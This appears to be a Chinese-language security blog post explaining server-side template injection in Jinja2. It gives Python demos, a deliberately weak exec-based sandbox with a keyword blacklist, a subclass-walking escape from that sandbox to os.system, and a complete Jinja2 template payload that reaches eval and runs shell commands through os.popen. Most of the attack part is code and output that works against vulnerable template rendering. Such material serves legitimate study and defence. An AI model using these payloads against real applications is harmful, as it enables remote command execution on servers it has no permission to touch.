---
title: "SSTI Jinja2"
date: 2016-03-01 10:44
---

# python 模板引擎 Jinja2存在服务端模板注入(SSTI)

[@nvisium][1] 在其博客发表文章 [《Inject Flask》][2]，控制Jinja模板内容时利用环境变量中已注册的用户自定义函数进行恶意调用或利用渲染进行XSS等

乌云文章[ 利用 Python 特性在 Jinja2 模板中执行任意代码 ][3]提到Jinja2模板可以访问一些python内置变量，如 [], {} 等，并且能够使用python变量类型中的一些函数。

访问的具有特殊意义的字符串：

```python
from Jinja2 import Template

def inject(cmd):
    return Template("input:{{ %s }}" % cmd).render()

for f in __builtins__.__dict__.keys():
    msg = inject(f+".__class__")
    if 'Undefined' not in msg:
        print("{f}: {msg}".format(f=f, msg=msg))
    
>>>
dict: input:<type 'function'>
False: input:<type 'bool'>
True: input:<type 'bool'>
None: input:<type 'NoneType'>
range: input:<type 'type'>
```

Jinja模板执行python代码，官方说明是需要在模板环境中注册函数才能在模板中调用。

```python
# file: demo1.py

import os
import sys
form jinja2 import Template

template = Template("input: {}".format(sys.argv[1] if len(sys.argv) > 1 else '<empty>'))
tempalte.global['os'] = os
print tempalte.render()


>>>python demo1.py "{{ os.popen("echo hello").read() }}"
input: hello
```

## 利用python特性直接执行任意代码

python沙盒逃逸, 参考: [CSAW-CTF Python sandbox write-up][4]

```python
# file: sandbox.py

from __future__ import print_function

print("Welcome to my Python sandbox! Enter commands below!")

banned = [
    "import",
    "exec",
    "eval",
    "pickle",
    "os",
    "subprocess",
    "kevin sucks",
    "input",
    "banned",
    "cry sum more",
    "sys"
]

targets = __builtins__.__dict__.keys()
targets.remove('raw_input')
targets.remove('print')

for x in targets:
    del __builtins__.__dict__[x]

while 1:
    print(">>>", end=' ')
    data = raw_input()
    for no in banned:
        if no.lower() in data.lower():
            print("No bueno")
            break
    else:
        exec data
```

```
python sandbox.py

Welcome to my Python sandbox! Enter commands below!
>>> [c for c in [].__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('echo hello sandbox')
hello sandbox
```

## 结合沙盒逃逸Jiaja2模板任意代码执行

Jinja2 模板payload

```
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.func_globals.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("id").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```

[1]: https://twitter.com/nvisium
[2]: https://nvisium.com/blog/2015/12/07/injecting-flask/
[3]: http://drops.wooyun.org/web/13057
[4]: https://hexplo.it/escaping-the-csawctf-python-sandbox/